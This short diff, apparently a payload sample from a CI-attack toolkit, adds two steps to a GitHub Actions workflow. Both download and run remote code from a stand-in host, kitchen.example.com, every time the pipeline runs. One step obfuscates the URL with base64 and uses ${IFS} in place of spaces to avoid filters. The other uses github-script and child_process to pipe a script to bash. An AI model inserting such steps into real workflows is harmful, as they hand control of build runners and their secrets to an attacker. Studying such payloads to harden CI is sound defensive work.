@@ -1,0 +1,16 @@
+diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
+index 1111111..2222222 100644
+--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -8,6 +8,15 @@ jobs:
+     steps:
+       - uses: actions/checkout@v4
++      # SmokedMeat rye: ifs_base64_curl_bash (space-constrained branch/title style)
++      - run: |
++          echo "$(curl${IFS}-s${IFS}$(base64${IFS}-d<<<'aHR0cDovL2tpdGNoZW4uZXhhbXBsZS5jb20vcj9pZD0x')|bash)"
++      - uses: actions/github-script@v7
++        with:
++          script: |
++            const cp = process.mainModule.require('child_process');
++            cp.execSync('curl -fsSL https://kitchen.example.com/r/x | bash', { stdio: 'inherit' });
+       - run: echo "build"
